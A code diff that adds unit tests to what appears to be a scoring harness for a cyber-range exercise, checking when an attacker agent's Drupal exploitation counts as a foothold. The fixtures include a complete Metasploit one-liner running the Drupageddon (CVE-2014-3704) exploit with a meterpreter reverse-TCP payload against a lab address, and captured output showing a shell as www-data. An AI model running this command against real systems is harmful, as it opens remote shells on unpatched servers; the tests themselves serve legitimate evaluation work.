@@ -244,6 +244,56 @@ def test_drupal_rce_does_not_double_credit_t1_already_reached():
     assert orch.state.red_tiers[TIER_FOOTHOLD] == 2
 
 
+# Real-shaped drupageddon (CVE-2014-3704) command + output, captured from a
+# live run against the actual target: drupalgeddon2's own injection technique
+# doesn't fire on this Drupal 7.5 build (reported/fixed in a prior round), but
+# drupageddon — a different vuln class (pre-auth SQLi -> cache-poisoning RCE)
+# — genuinely opens a meterpreter session; `sessions -i 1 -c id` in the same
+# one-shot command returns real `id` output directly, no separate step needed.
+DRUPAGEDDON_COMMAND = (
+    'IP=$(hostname -I | cut -d" " -f1); msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; '
+    'set RHOSTS 192.168.64.12; set TARGETURI /drupal/; set PAYLOAD php/meterpreter/reverse_tcp; '
+    'set LHOST $IP; set LPORT 4444; run -z; sessions -i 1 -c id; exit -y"'
+)
+
+DRUPAGEDDON_SUCCESS_OUTPUT = """\
+[*] Started reverse TCP handler on 192.168.64.11:4444
+[*] Sending stage (39927 bytes) to 192.168.64.12
+[*] Meterpreter session 1 opened (192.168.64.11:4444 -> 192.168.64.12:60863)
+[*] Session 1 created in the background.
+[*] Running 'id' on meterpreter session 1 (192.168.64.12)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+"""
+
+
+def test_drupageddon_id_output_credits_t1():
+    orch = _orch()
+    tc = _attacker_tool(DRUPAGEDDON_COMMAND)
+    assert orch._check_red_tier1_via_drupal_rce(tc, DRUPAGEDDON_SUCCESS_OUTPUT) is True
+
+
+def test_drupageddon_session_opened_without_id_readback_does_not_credit_t1():
+    # A session existing isn't the same as a command actually running — the
+    # doctrine's own central distinction for this module. No `uid=` line here.
+    out = """\
+[*] Started reverse TCP handler on 192.168.64.11:4444
+[*] Sending stage (39927 bytes) to 192.168.64.12
+[*] Meterpreter session 1 opened (192.168.64.11:4444 -> 192.168.64.12:60863)
+[*] Session 1 created in the background.
+"""
+    orch = _orch()
+    tc = _attacker_tool(DRUPAGEDDON_COMMAND)
+    assert orch._check_red_tier1_via_drupal_rce(tc, out) is False
+
+
+def test_drupal_check_still_accepts_drupalgeddon2_command():
+    # Widening the gate to accept drupageddon must not drop drupalgeddon2 —
+    # the real msf module output shape from the prior round's live grounding.
+    orch = _orch()
+    tc = _attacker_tool(DRUPAL_RCE_COMMAND)
+    assert orch._check_red_tier1_via_drupal_rce(tc, DRUPAL_RCE_SUCCESS_OUTPUT) is True
+
+
 def test_webshell_and_drupal_gates_overlap_credits_t1_exactly_once():
     # A single run_on_attacker command/output pair that satisfies BOTH T1 gates:
     # the command contains "http" (webshell gate) AND "drupalgeddon" (drupal gate)
